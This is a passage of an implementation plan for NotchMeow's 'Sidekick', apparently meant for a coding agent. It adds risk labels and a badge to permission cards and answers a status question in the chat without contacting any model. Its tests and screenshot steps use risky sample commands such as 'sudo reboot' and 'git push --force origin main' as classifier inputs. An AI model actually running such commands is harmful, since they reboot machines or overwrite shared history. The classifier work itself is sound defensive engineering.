  assert.equal(wasCut("Bash", { command: `${"é".repeat(998)}…` }), false, "1996 bytes and the mark are under 2000: not cut");
  for (const odd of [null, undefined, 7, "x", [], { command: 5 }, { command: [cut("a")] }]) assert.doesNotThrow(() => wasCut("Bash", odd));
});

test("only a high risk has the orange badge; the medium and the low show the grey line alone", () => {
  assert.equal(badgeText("high"), "High risk");
  for (const r of ["medium", "low", null, undefined, "bogus"]) assert.equal(badgeText(r), null, String(r));
});

test("the Sidekick explains through the contract and never throws", () => {
  const sk = new Sidekick({ now: () => 1, platform: "windows", home, idleSeconds: async () => null, settings: () => ({}), saveSettings: () => {}, world: {}, present: () => {}, updated: () => {}, timer: { set: () => 1, clear: () => {} } });
  assert.equal(sk.explain("Bash", { command: "sudo reboot" }, cwd).reasonId, "sudo");
  assert.doesNotThrow(() => sk.explain(undefined, undefined, undefined));
  const hostile = {};
  Object.defineProperty(hostile, "command", { get() { throw new Error("boom"); } });
  assert.doesNotThrow(() => sk.explain("Bash", hostile, cwd));
});

test("the card: the line sits between the command and the buttons, the badge in the who row, the button row is built once as before, and the buttons are unchanged", () => {
  const v = source("views/views.ts");
  const at = (s) => { const i = v.indexOf(s); assert.ok(i > 0, s); return i; };
  assert.match(v, /card\("amber", stack\(116, 16, who, code, why, row\)\)/);
  assert.ok(at('class: "sk-badge"') < at("why.textContent =") && at("why.textContent =") < at('if (rowKey === "built") return;'), "the line and the badge are set in sync(), before the row's guard");
  const after = v.slice(at('if (rowKey === "built") return;'), at("// ── Question"));
  assert.match(after, /btn\("Deny", "secondary", \(\) => actions\.decide\("deny"\), "N"\),\s*btn\("Allow", "primary", \(\) => actions\.decide\("allow"\), "Y"\),/);
  assert.equal(after.split("clear(row)").length - 1, 1, "the row is cleared and built once, never by the new code");
  assert.match(v, /code\.textContent = State\.pendingApproval\?\.command \|\| State\.pendingApproval\?\.tool \|\| "…";/, "the command line is as it was");
});

test("the request is explained as the card goes up; a high risk gives the surprised emote once, unless the desktop cat is out; the relay's cut and the home folder reach it", () => {
  const hooks = source("island/hooks.ts");
  assert.match(hooks, /const why = Hub\.sk\?\.explain\(tool, input, cwd\) \?\? null;/);
  assert.match(hooks, /\.\.\.\(why \? \{ target: why\.target, risk: why\.risk, line: why\.line \} : \{\}\)/);
  assert.match(hooks, /if \(why\?\.risk === "high" && !State\.desktopNotchEmpty\) island\.emote\("surprised"\);/);
  assert.equal(hooks.split('island.emote("surprised")').length - 1, 1, "once, and no other emote is added");
  assert.match(source("core/state.ts"), /target\?: string;\s*risk\?: "low" \| "medium" \| "high";\s*line\?: string;/);
  assert.match(source("main.ts"), /sidekickEnv\(island, boot\?\.home \?\? ""\)/);
  const lib = fs.readFileSync(new URL("../../src-tauri/src/lib.rs", import.meta.url), "utf8");
  assert.match(lib, /home: platform::home_dir\(\)\.to_string_lossy\(\)\.to_string\(\),/);
  assert.match(source("core/steps.ts"), /return `\$\{tool\} · \$\{value\.trim\(\)\}`;/, "approvalTarget is as it shipped");
});
EOF
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "ERR_MODULE_NOT_FOUND|Cannot find|✖|ℹ (pass|fail)" | head -6 )
```

Expected (a failure, exit non-zero): `ERR_MODULE_NOT_FOUND`.

- [ ] **Step 2: Write `explain.ts` and the edits**

```bash
mkdir -p windows/src/sidekick
cat > windows/src/sidekick/explain.ts <<'EOF'
// The line under a permission request (sub-project F1, spec "Risk rules" and "The permission line"): how risky it is and a fixed sentence saying so, from the contract's `explain`.
// It labels. It never allows, denies or blocks: only the user's click does. The one thing this adds to the rules is the Windows relay's cut: it cuts every string at 2000 bytes, so a long
// command reaches the app without its end, and a label that read only the beginning must not call it safe. Pure; loaded by the plain-Node checks.

import { REASONS, explain } from "./core.ts";
import type { Explained, Risk } from "./core.ts";

/** The relay's longest string (hook/src/main.rs `MAX_FIELD_LEN`): a longer one arrives cut at this many bytes, with "…" after it. */
export const RELAY_CUT_BYTES = 2000;

const SHELL_TOOLS = new Set(["Bash", "PowerShell", "run_shell_command", "shell", "local_shell", "exec_command"]);
/** The fields that name what a non-shell tool touches. A cut file body (`content`, `new_string`) changes nothing about the label, so it is not looked at. */
const PATH_FIELDS = ["file_path", "path", "absolute_path", "notebook_path", "paths", "dir_path", "target_file"];

const utf8Bytes = (s: string): number => new TextEncoder().encode(s).length;
const isCut = (v: unknown): boolean => typeof v === "string" && v.endsWith("…") && utf8Bytes(v) >= RELAY_CUT_BYTES;

/** Whether the part of a request that the label depends on came through the relay cut: the command of a shell tool, a path of any other tool. */
export function wasCut(tool: string, input: unknown): boolean {
  if (input === null || typeof input !== "object" || Array.isArray(input)) return false;
  const o = input as Record<string, unknown>;
  if (SHELL_TOOLS.has(tool)) return isCut(o.command) || (Array.isArray(o.command) && o.command.some(isCut));
  return PATH_FIELDS.some((k) => (Array.isArray(o[k]) ? (o[k] as unknown[]).some(isCut) : isCut(o[k])));
}

const unsure = (): Explained => {
  const r = REASONS.find((x) => x.id === "unsure")!;
  return { risk: r.risk, reasonId: r.id, line: r.line, target: "" };
};

/**
 * `explain` of the contract for one permission request, `cwd` and `home` as the app knows them. A request whose command or path was cut by the relay is at least `unsure` (medium): what
 * the rules read is only its beginning. A label that is already medium or high stays what it is.
 */
export function explainRequest(tool: string, input: unknown, cwd: string, home: string): Explained {
  const got = explain("integration_claude", tool, input, cwd, home);
  return got.risk === "low" && wasCut(tool, input) ? unsure() : got;
}

/** The words of the orange badge: only a high risk has one. Medium and low show the grey line alone. */
export const badgeText = (risk: Risk | null | undefined): string | null => (risk === "high" ? "High risk" : null);
EOF
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

# ── Rust: the user's home folder goes to the page (to read `~` in a path), nothing else ──
edit("windows/src-tauri/src/lib.rs", r'''    /// False where the system places windows itself (GNOME): Settings says so under the desktop cat's switch.
    desktop_positioned: bool,
}
''', r'''    /// False where the system places windows itself (GNOME): Settings says so under the desktop cat's switch.
    desktop_positioned: bool,
    /// The user's home folder: the Sidekick reads `~` and `$HOME` in a request's path against it. It is never shown, logged or sent anywhere.
    home: String,
}
''')
edit("windows/src-tauri/src/lib.rs", r'''        desktop_positioned: platform::desktop_positioned(),
    }
''', r'''        desktop_positioned: platform::desktop_positioned(),
        home: platform::home_dir().to_string_lossy().to_string(),
    }
''')
edit("windows/src/core/bridge.ts", r'''  desktopPositioned: boolean;
}
''', r'''  desktopPositioned: boolean;
  /** The user's home folder, for the Sidekick's reading of `~` in a path. */
  home: string;
}
''')

# ── State: what the card knows about the request ──
edit("windows/src/core/state.ts", r'''  /** The subagent that asked (the hook's `agent_id`), when one did: its kitten waits on an approval until this one is answered. */
  agentId?: string;
}
''', r'''  /** The subagent that asked (the hook's `agent_id`), when one did: its kitten waits on an approval until this one is answered. */
  agentId?: string;
  /** The Sidekick's reading of the request (sub-project F1): the basename it names (a file, or empty), how risky it looks, and one fixed sentence saying why. Missing when it was not read. */
  target?: string;
  risk?: "low" | "medium" | "high";
  line?: string;
}
''')

# ── The Sidekick explains a request ──
edit("windows/src/sidekick/controller.ts", r'''import { StuckClock } from "./stuckclock.ts";
''', r'''import { StuckClock } from "./stuckclock.ts";
import { explainRequest } from "./explain.ts";
import type { Explained } from "./core.ts";
''')
edit("windows/src/sidekick/controller.ts", r'''  platform: Exclude<Platform, "mac">;
  /** Seconds since''', r'''  platform: Exclude<Platform, "mac">;
  /** The user's home folder, to read `~` in a path. Used for the risk label only and never shown. */
  home: string;
  /** Seconds since''')
edit("windows/src/sidekick/controller.ts", r'''  /** The user clicked Allow or Deny on a card. */''', r'''  /**
   * How risky a permission request looks and the sentence for it (the card's grey line and orange badge). It labels only. It never throws: a request it cannot read is
   * `unsure`, which is medium.
   */
  explain(tool: string, input: unknown, cwd: string): Explained {
    try {
      return explainRequest(tool, input, cwd, this.env.home);
    } catch {
      return explainRequest("", null, "", "");
    }
  }

  /** The user clicked Allow or Deny on a card. */''')

# ── hooks.ts: the request is explained, and a high risk surprises the cat ──
edit("windows/src/island/hooks.ts", r'''      State.pendingApproval = {
        requestId,
        sessionId: payload.session_id ?? "",
        tool,
        command: approvalTarget(tool, input),
        ...(typeof payload.agent_id === "string" && payload.agent_id ? { agentId: payload.agent_id } : {}),
      };
''', r'''      // The Sidekick's grey line and risk badge (sub-project F1). It only labels: the card, its buttons and the 110 s limit are as they were.
      const why = Hub.sk?.explain(tool, input, cwd) ?? null;
      State.pendingApproval = {
        requestId,
        sessionId: payload.session_id ?? "",
        tool,
        command: approvalTarget(tool, input),
        ...(typeof payload.agent_id === "string" && payload.agent_id ? { agentId: payload.agent_id } : {}),
        ...(why ? { target: why.target, risk: why.risk, line: why.line } : {}),
      };
''')
edit("windows/src/island/hooks.ts", r'''      // NotchMeow answers within 108 s or not at all;''', r'''      // A high risk gives the cat the surprised emote, once (no new emote). If the desktop cat is out it flies to the notch for this request with that very emote already.
      if (why?.risk === "high" && !State.desktopNotchEmpty) island.emote("surprised");
      // NotchMeow answers within 108 s or not at all;''')
edit("windows/src/island/island.ts", r'''  /** Alert from the hook server: open on this view. Pinned alerts never auto-close. */''', r'''  /** A one-off face from the big cat (the Sidekick's surprised look at a high-risk request). */
  emote(name: BotEmoteName): void {
    this.engine.triggerEmote(name);
  }

  /** Alert from the hook server: open on this view. Pinned alerts never auto-close. */''')
edit("windows/src/island/island.ts", r'''  type Circle, type IslandMode, type IslandViewName,
} from "../core/layout";''', r'''  type BotEmoteName, type Circle, type IslandMode, type IslandViewName,
} from "../core/layout";''')

# ── The card: one grey line under the command, a badge in the "who" row. The button row is not touched. ──
edit("windows/src/views/views.ts", r'''import { renderIntegrationCard, type IntegrationCardHooks } from "./integrations";
''', r'''import { renderIntegrationCard, type IntegrationCardHooks } from "./integrations";
import { badgeText } from "../sidekick/explain.ts";
''')
edit("windows/src/views/views.ts", r'''  const who = h("div");
  const code = h("div", { class: "code" });
  const row = h("div", { class: "actions" });
  const el = h("div", { class: "view" }, card("amber", stack(116, 16, who, code, row)));
  let rowKey = "";
  return {
    el,
    sync() {
      clear(who);
      who.append(agentWho(State.focusTask, "needs permission"));''', r'''  const who = h("div");
  const code = h("div", { class: "code" });
  // The Sidekick's line (sub-project F1): one fixed grey sentence under the command, from the contract's `explain`.
  const why = h("div", { class: "sk-why" });
  const row = h("div", { class: "actions" });
  const el = h("div", { class: "view" }, card("amber", stack(116, 16, who, code, why, row)));
  let rowKey = "";
  return {
    el,
    sync() {
      clear(who);
      const head = agentWho(State.focusTask, "needs permission");
      // The orange badge, at the trailing edge of the "who" row, on a high risk only.
      const badge = badgeText(State.pendingApproval?.risk);
      if (badge) head.append(h("span", { class: "sk-badge", text: badge }));
      who.append(head);
      why.textContent = State.pendingApproval?.line ?? "";
      why.style.display = State.pendingApproval?.line ? "" : "none";''')

# ── main.ts: the home folder ──
edit("windows/src/main.ts", r'''  Hub.sk = new Sidekick(sidekickEnv(island));''', r'''  Hub.sk = new Sidekick(sidekickEnv(island, boot?.home ?? ""));''')
edit("windows/src/sidekick/appenv.ts", r'''export function sidekickEnv(island: Island): SidekickEnv {
  return {
    now: () => Date.now() + Skew.ms,
    platform: platformName(),''', r'''export function sidekickEnv(island: Island, home: string): SidekickEnv {
  return {
    now: () => Date.now() + Skew.ms,
    platform: platformName(),
    home,''')
PY
```

```bash
cat >> windows/src/style.css <<'EOF'

/* ── The Sidekick's line and badge on the permission card (sub-project F1): new class names only ──────────────────────────────────────────── */
.sk-why {
  font: 400 11px var(--font);
  color: #8e939c;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
.sk-badge {
  margin-left: auto;
  font: 600 10px var(--font);
  color: #1c1204;
  background: #f5a524;
  border-radius: 999px;
  padding: 1px 8px;
}
EOF
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "^ℹ (tests|pass|fail)" )
```

Expected: `ℹ fail 0`, `ℹ tests 71`, `ℹ pass 71`.

```bash
( cd windows && npx --no-install tsc --noEmit; echo "tsc exit $?" )
```

Expected: `tsc exit 0`.

```bash
( cd windows && npm run check:cat 2>&1 | grep -E "^ℹ (pass|fail)" )
```

Expected: `ℹ pass 372`, `ℹ fail 0`.

```bash
windows/scripts/cargo-linux.sh test -p notchmeow settings --target-dir /repo/windows/target/f1-tauri
```

Expected: `test result: ok`.

- [ ] **Step 3: Prove the cut rule and the badge bite**

```bash
( cd windows && python3 ../.claude/checkpoints/f1-tauri/mut.py src/sidekick/explain.ts "return got.risk === \"low\" && wasCut(tool, input) ? unsure() : got;" "return got;" scripts/sidekick-tests/explain.test.mjs )
```

Expected: `# fail 1`.

```bash
( cd windows && python3 ../.claude/checkpoints/f1-tauri/mut.py src/sidekick/explain.ts "risk === \"high\" ? \"High risk\" : null" "risk === \"medium\" ? \"High risk\" : null" scripts/sidekick-tests/explain.test.mjs )
```

Expected: `# fail 1`.

- [ ] **Step 4: Look at the card at each risk, and measure that it fits**

The card is a fixed 160 px island; the extra line must fit. **If the stack scrolls (`stackScroll` greater than `stackClient`), stop: that is a failure of this task, not a thing to shrink.**

```bash
( cd .claude/checkpoints/f1-tauri && for r in high medium low; do bash shot.sh "" "window.__nm.run.card('$r')" card-$r; done; playwright-cli -s=f1 eval "(()=>{const st=document.querySelector('#views .view.on .stack'); return {stackScroll: st.scrollHeight, stackClient: st.clientHeight}})()" | sed -n 2,5p )
```

Expected: `card-high.png`, `card-medium.png`, `card-low.png`, `"stackScroll"`.

Say what you saw: for the high risk, the command line `Bash · git push --force origin main`, the grey line **"Overwrites the remote branch history."** under it, an orange **High risk** capsule at the right end of the "who" row, and **Deny** and **Allow** unchanged; for the medium (`npm install left-pad`) **"Installs software."** and **no badge**; for the low (`npm test`) **"Runs the project's own test or build script."** and no badge. `stackScroll` equals `stackClient`.

- [ ] **Step 5: Commit**

```bash
git rev-parse --show-toplevel; git branch --show-current
git add windows/src windows/src-tauri/src/lib.rs windows/scripts/sidekick-tests
git commit -F - <<'MSG'
feat(sidekick): the permission line, the risk badge and the surprised emote

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
MSG
```

Expected: `f1/tauri-sidekick`.

## Checkpoint 1: the owner looks at the pictures

The session copies these into `.claude/checkpoints/f1-tauri/`, sends the owner their paths with the list, and waits:

1. `settings-sidekick.png`: the Sidekick section (two switches, "Nothing is muted", "Permission explanations are always on.").
2. `card-high.png`, `card-medium.png`, `card-low.png`: the permission card with its line, and the orange High risk capsule on the first only; the card as it ships otherwise.
3. `note-recap.png`: the recap ("Welcome back", the sentence, OK).
4. `scn-loop.png` and `scn-waiting.png`: a nudge ("Not now", "Open terminal").

The owner's questions at this checkpoint: is the line's grey readable on the amber card? Does the capsule sit well in the "who" row? Do the notes look like the island's own cards? Nothing proceeds until the owner replies.

### Task 9: "What's Claude doing?" in the chat

**Files:**
- Create: `windows/src/sidekick/statuschat.ts`, `windows/scripts/sidekick-tests/status.test.mjs`
- Modify: `windows/src/sidekick/controller.ts`, `windows/src/core/state.ts` (`localAnswers`), `windows/src/island/island.ts` (a new conversation clears the cards, the chat's height), `windows/src/views/chat.ts`

**Interfaces:**
- Consumes: Task 1's `matchStatusQuestion`, `statusOf`, `Recap`, `StatusQuestion`; Task 4's `Sidekick`.
- Produces: `answerStatus(text, source, afterCount, id) → LocalAnswer | null`, `interleave(messages, answers)`, `STATUS_CHIP_TEXT`, `STATUS_CAPTION` ("From NotchMeow, on this computer"), `LocalAnswer {id, afterCount, question, lines}` (Task 12 adds `facts`); `Sidekick.matchStatus(text)`, `Sidekick.status(agentId)`; `State.localAnswers`.

**It never reaches a model and is never in a conversation.** The chat's `submit()` asks `answerLocally(text)` **first**, before a waiting retry, a dropped file, a setting or the conversation is touched; a match makes a card in `State.localAnswers` (not `State.chatHistory`, which is what `featureFor`, "Continue" and "Retry" read, and the display list of what the model was told), and returns. The card is a user bubble with the question and a reply with the ledger's lines, captioned "From NotchMeow, on this computer". A chip in the empty conversation asks the same question, **and is there only while an agent is live** (the owner's answer). A message that merely contains the words goes to the model as usual (`matchStatusQuestion` is the contract's whole-message rule).

- [ ] **Step 1: Write the test**

The matcher is replayed from `status-cases.json`; then the answer for nothing running, an agent that is not running, a running agent (no secret in it), a message that is not the question, the order of the cards among the messages, and pins on `submit()`: the local answer comes before `cancelCountdown()`, `pendingAttachments()`, `featureFor(`, `void ask(` and the push to `State.chatHistory`.

```bash
mkdir -p windows/scripts/sidekick-tests
cat > windows/scripts/sidekick-tests/status.test.mjs <<'EOF'
import test from "node:test";
import assert from "node:assert/strict";
import { Sidekick } from "../../src/sidekick/controller.ts";
import { STATUS_CAPTION, STATUS_CHIP_TEXT, answerStatus, interleave } from "../../src/sidekick/statuschat.ts";
import { load, source } from "./util.mjs";

const T0 = 30_000_000;
function rig() {
  const w = { t: T0 };
  const sk = new Sidekick({
    now: () => w.t, platform: "windows", home: "C:\\Users\\me", idleSeconds: async () => null, settings: () => ({ on: true, local: true, dismissals: {} }), saveSettings: () => {},
    world: { ratelimit: () => false, card: () => null, ownCard: () => false, typing: () => false, onScreen: () => true }, present: () => {}, updated: () => {}, timer: { set: () => 1, clear: () => {} },
  });
  const hook = (name, extra = {}) => sk.hook({ hook_event_name: name, session_id: "S1", cwd: "C:\\work\\app", ...extra });
  return { w, sk, hook };
}

test("the contract's matcher decides what is the question: every message of the fixture matches or does not, and only the whole short message counts", () => {
  const { sk } = rig();
  for (const m of load("status-cases.json").matcher) assert.deepEqual(sk.matchStatus(m.text), { matched: m.matched, agentId: m.agentId }, JSON.stringify(m.text));
  assert.equal(sk.matchStatus(STATUS_CHIP_TEXT).matched, true, "the chip asks the question the matcher knows");
  for (const odd of ["Why is Claude doing that? What's Claude doing?", "what's claude doing in the file src/a.ts", "x".repeat(200), "", undefined, 7, null]) assert.equal(sk.matchStatus(odd).matched, false, String(odd));
});

test("nothing is running: the answer says so; an agent that is not running says so by name", () => {
  const { sk } = rig();
  assert.deepEqual(answerStatus("What's Claude doing?", sk, 0, 1), { id: 1, afterCount: 0, question: "What's Claude doing?", lines: ["Claude Code is not running right now."] });
  assert.deepEqual(answerStatus("status", sk, 2, 2).lines, ["No agent is running right now."]);
  assert.deepEqual(answerStatus("what's gemini doing", sk, 0, 3).lines, ["Gemini CLI is not running right now."]);
});

test("a running agent is told in the recap's words, with counts and basenames and nothing else", () => {
  const { w, sk, hook } = rig();
  hook("PostToolUse", { tool_name: "Edit", tool_input: { file_path: "C:\\work\\app\\src\\SECRET-DIR\\main.ts", old_string: "SECRET-OLD", new_string: "SECRET-NEW" }, prompt: "SECRET-PROMPT" });
  w.t += 5000;
  hook("PostToolUse", { tool_name: "Bash", tool_input: { command: "echo SECRET-CMD" } });
  const a = answerStatus("what is claude doing right now?", sk, 4, 9);
  assert.equal(a.lines.length, 1);
  assert.match(a.lines[0], /^Claude Code in app has run 2 steps, edited main\.ts, and is still working\.$/);
  const text = JSON.stringify(a);
  for (const s of ["SECRET-DIR", "SECRET-OLD", "SECRET-NEW", "SECRET-PROMPT", "SECRET-CMD", "C:\\"]) assert.ok(!text.includes(s), s);
  assert.equal(a.afterCount, 4);
});

test("a message that is not the question is not answered here: it goes on to the chat, untouched", () => {
  const { sk } = rig();
  for (const text of ["Explain this stack trace", "What's the weather doing?", "status of my build pipeline please, in detail"]) assert.equal(answerStatus(text, sk, 0, 1), null, text);
});

test("the cards stand where they were asked: after the message they followed, a question and its answer together", () => {
  const msgs = ["m0", "m1", "m2"];
  const rows = interleave(msgs, [{ id: 1, afterCount: 0, question: "q", lines: ["a"] }, { id: 2, afterCount: 2, question: "q", lines: ["b"] }, { id: 3, afterCount: 3, question: "q", lines: ["c"] }]);
  assert.deepEqual(rows.map((r) => ("answer" in r ? `A${r.answer.id}` : r.message)), ["A1", "m0", "m1", "A2", "m2", "A3"]);
  assert.deepEqual(interleave(msgs, []).map((r) => r.message), msgs);
  assert.deepEqual(interleave([], [{ id: 1, afterCount: 5, question: "q", lines: [] }]).map((r) => r.answer.id), [1], "an answer after a conversation that was cleared is still shown");
  assert.equal(STATUS_CAPTION, "From NotchMeow, on this computer");
});

test("the chat answers before it chooses a model, keeps the card out of the conversation, and the chip asks the same question", () => {
  const chat = source("views/chat.ts");
  const submit = chat.slice(chat.indexOf("  function submit() {"), chat.indexOf("  function continueOrRetry"));
  const at = (s) => { const i = submit.indexOf(s); assert.ok(i > 0, s); return i; };
  assert.ok(at("if (answerLocally(text)) return;") < at("cancelCountdown()"), "before a waiting retry is touched");
  assert.ok(at("if (answerLocally(text)) return;") < at("pendingAttachments()"), "before a dropped file is taken along");
  assert.ok(at("if (answerLocally(text)) return;") < at("featureFor("), "before a setting is chosen");
  assert.ok(at("if (answerLocally(text)) return;") < at("void ask("), "before any model is asked");
  assert.ok(at("if (answerLocally(text)) return;") < at("State.chatHistory.push"), "before the message joins the conversation");
  const local = chat.slice(chat.indexOf("  function answerLocally"), chat.indexOf("  function localCard"));
  assert.match(local, /State\.localAnswers\.push\(a\);/);
  assert.doesNotMatch(local, /chatHistory\.push|Bridge\.|ask\(/, "the local answer touches no conversation and no provider");
  assert.match(chat, /onclick: \(\) => void answerLocally\(STATUS_CHIP_TEXT\)/);
  assert.match(chat, /if \(Hub\.sk && Hub\.sk\.ledger\.live\.length > 0 && State\.chatHistory\.length === 0 && State\.localAnswers\.length === 0\) \{/, "the chip is there only while an agent is live");
  assert.match(chat, /Hub\.sk\?\.ledger\.live\.length \? "live" : "",/, "and the view redraws when that changes");
  assert.doesNotMatch(source("sidekick/statuschat.ts"), /Bridge|aiChat|fetch\(|import .*core\/bridge/, "the module has nothing that can talk to a model");
  assert.match(source("island/island.ts"), /State\.chatHistory = \[\];\s*State\.localAnswers = \[\];/, "a new conversation clears the cards");
});
EOF
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "ERR_MODULE_NOT_FOUND|Cannot find|✖|ℹ (pass|fail)" | head -6 )
```

Expected (a failure, exit non-zero): `ERR_MODULE_NOT_FOUND`.

- [ ] **Step 2: Write `statuschat.ts` and the edits**

```bash
mkdir -p windows/src/sidekick
cat > windows/src/sidekick/statuschat.ts <<'EOF'
// "What's Claude doing?" in the chat (sub-project F1, spec "What's Claude doing?"): a short message that is exactly that question is answered here, on this computer, from the ledger. The
// answer is a card of NotchMeow's own. It is never added to the conversation: it is not in `State.chatHistory`, it is not in what any model is sent, and the question never reaches a model, a
// cloud one least of all. This module imports nothing that talks to a model. Pure; loaded by the plain-Node checks.

import type { Recap, StatusQuestion } from "./core.ts";

/** The words of the chip in the chat's empty conversation, and the question it asks. */
export const STATUS_CHIP_TEXT = "What's Claude doing?";

/** The line under the answer: where it came from. */
export const STATUS_CAPTION = "From NotchMeow, on this computer";

/** One answer from NotchMeow itself, shown in the chat after `afterCount` of the conversation's messages. It is the app's, not the conversation's. */
export interface LocalAnswer {
  id: number;
  /** How many messages of the conversation came before it, so the card stands where it was asked. */
  afterCount: number;
  /** What the user asked, as they typed it. */
  question: string;
  /** The lines of the answer: the ledger's templates, an agent's name, counts and basenames. */
  lines: string[];
}

/** What the answer needs of the Sidekick. */
export interface StatusSource {
  matchStatus(text: string): StatusQuestion;
  status(agentId: string | null): Recap;
}

/** The answer to `text`, or null when it is a normal chat message (anything longer, or different: a real question that merely contains the words goes to the model as usual). */
export function answerStatus(text: string, source: StatusSource, afterCount: number, id: number): LocalAnswer | null {
  const m = source.matchStatus(text);
  if (!m.matched) return null;
  return { id, afterCount, question: text.trim(), lines: [...source.status(m.agentId).lines] };
}

/**
 * The chat's rows in the order they are shown: the conversation's messages, with each local answer after the message it followed (a question and its card), and the answers asked
 * after the last message at the end. Returns what to draw, not elements: the view builds them.
 */
export function interleave<T>(messages: readonly T[], answers: readonly LocalAnswer[]): Array<{ message: T } | { answer: LocalAnswer }> {
  const rows: Array<{ message: T } | { answer: LocalAnswer }> = [];
  const placed = new Set<number>();
  messages.forEach((message, i) => {
    for (const a of answers) if (a.afterCount === i && !placed.has(a.id)) { rows.push({ answer: a }); placed.add(a.id); }
    rows.push({ message });
  });
  for (const a of answers) if (!placed.has(a.id)) rows.push({ answer: a });
  return rows;
}
EOF
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src/sidekick/controller.ts", r'''import { STUCK, agentName, nudgeText, recapOf, stuckStep } from "./core.ts";
import type { Nudge, NoteKind, Platform, SidekickSettings, StuckContext } from "./core.ts";
''', r'''import { STUCK, agentName, matchStatusQuestion, nudgeText, recapOf, statusOf, stuckStep } from "./core.ts";
import type { Nudge, NoteKind, Platform, Recap, SidekickSettings, StatusQuestion, StuckContext } from "./core.ts";
''')
edit("windows/src/sidekick/controller.ts", r'''  /** The user clicked Allow or Deny on a card. */''', r'''  /** Is this message the question "What's Claude doing?" (the contract's `matchStatusQuestion`: the whole short message, nothing more)? */
  matchStatus(text: string): StatusQuestion {
    try {
      return matchStatusQuestion(text);
    } catch {
      return { matched: false, agentId: null };
    }
  }

  /** What the agents are doing, from the ledger, in the same words as the recap: every live session, or the one agent. Answered here and never sent anywhere. */
  status(agentId: string | null): Recap {
    return statusOf({ now: this.env.now(), sessions: this.ledger.snapshot.sessions }, agentId ?? undefined);
  }

  /** The user clicked Allow or Deny on a card. */''')

edit("windows/src/core/state.ts", r'''import type { Note } from "../sidekick/notes.ts";
''', r'''import type { Note } from "../sidekick/notes.ts";
import type { LocalAnswer } from "../sidekick/statuschat.ts";
''')
edit("windows/src/core/state.ts", r'''  chatHistory: ChatMessage[] = [];
''', r'''  chatHistory: ChatMessage[] = [];
  /** NotchMeow's own answers in the chat ("What's Claude doing?", sub-project F1). Never part of `chatHistory`, so never part of the conversation any model is sent. */
  localAnswers: LocalAnswer[] = [];
''')
edit("windows/src/island/island.ts", r'''    State.chatHistory = [];
    State.chatEpoch++;
''', r'''    State.chatHistory = [];
    State.localAnswers = [];
    State.chatEpoch++;
''')
edit("windows/src/island/island.ts", r'''    const { w, h } = islandSize(State.mode, State.view, State.chatHistory.length, State.sidekickNote?.lines.length ?? 1);''', r'''    const { w, h } = islandSize(State.mode, State.view, State.chatHistory.length + State.localAnswers.length, State.sidekickNote?.lines.length ?? 1);''')
edit("windows/src/island/island.ts", r'''    return chatPromptHeight(State.chatHistory.length);''', r'''    return chatPromptHeight(State.chatHistory.length + State.localAnswers.length);''')

edit("windows/src/views/chat.ts", r'''import { decideChatApproval, releaseChatApprovals } from "../island/hooks";
''', r'''import { decideChatApproval, releaseChatApprovals } from "../island/hooks";
import { Hub } from "../sidekick/hub.ts";
import { STATUS_CAPTION, STATUS_CHIP_TEXT, answerStatus, interleave, type LocalAnswer } from "../sidekick/statuschat.ts";
''')
edit("windows/src/views/chat.ts", r'''    const text = input.value.trim();
    if (!text) return;
    input.value = "";
    Sound.play("send");''', r'''    const text = input.value.trim();
    if (!text) return;
    input.value = "";
    // "What's Claude doing?" is answered here, on this computer, before any model is chosen or any file is read: it never reaches a model (sub-project F1).
    if (answerLocally(text)) return;
    Sound.play("send");''')
edit("windows/src/views/chat.ts", r'''  function submit() {''', r'''  /** The status question and its answer, from the ledger. NotchMeow's own card, in `State.localAnswers`: not a message, not in the conversation, not sent to anything. */
  function answerLocally(text: string): boolean {
    const sk = Hub.sk;
    if (!sk) return false;
    const a = answerStatus(text, sk, State.chatHistory.length, nextId++);
    if (!a) return false;
    State.localAnswers.push(a);
    State.notify();
    onHeightChange();
    return true;
  }

  function localCard(a: LocalAnswer): HTMLElement[] {
    return [
      h("div", { class: "chat-row user" }, h("div", { class: "bubble", text: a.question })),
      h("div", { class: "chat-row" }, h("div", { class: "reply-col" }, ...a.lines.map((l) => h("div", { class: "reply", text: l })), h("div", { class: "reply-caption", text: STATUS_CAPTION }))),
    ];
  }

  function submit() {''')
edit("windows/src/views/chat.ts", r'''        ...State.chatHistory.map((m) =>''', r'''        // A local answer's words can change (the ledger moves on only when asked again, but a card is a card): it keys on its lines.
        Hub.sk?.ledger.live.length ? "live" : "",
        ...State.localAnswers.map((a) => `la${a.id}:${a.afterCount}:${a.lines.join("/")}`),
        ...State.chatHistory.map((m) =>''')
edit("windows/src/views/chat.ts", r'''        for (const m of State.chatHistory) {
          if (m.role === "assistant" && !m.content && !m.steps?.length && thinking) continue;
          log.append(bubble(m));
        }''', r'''        for (const row of interleave(State.chatHistory, State.localAnswers)) {
          if ("answer" in row) { log.append(...localCard(row.answer)); continue; }
          const m = row.message;
          if (m.role === "assistant" && !m.content && !m.steps?.length && thinking) continue;
          log.append(bubble(m));
        }''')
edit("windows/src/views/chat.ts", r'''        if (empty && !showGuide) log.append(emptyState());''', r'''        // The chip of the empty conversation: the question the Sidekick answers on this computer.
        if (Hub.sk && Hub.sk.ledger.live.length > 0 && State.chatHistory.length === 0 && State.localAnswers.length === 0) {
          log.append(h("div", { class: "empty-state" }, h("button", { class: "btn secondary", text: STATUS_CHIP_TEXT, onclick: () => void answerLocally(STATUS_CHIP_TEXT) })));
        }
        if (empty && !showGuide) log.append(emptyState());''')
PY
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "^ℹ (tests|pass|fail)" )
```

Expected: `ℹ fail 0`, `ℹ tests 77`, `ℹ pass 77`.

```bash
( cd windows && npx --no-install tsc --noEmit; echo "tsc exit $?" )
```

Expected: `tsc exit 0`.

```bash
( cd windows && npm run check:cat 2>&1 | grep -E "^ℹ (pass|fail)" )
```

Expected: `ℹ pass 372`, `ℹ fail 0`.

```bash
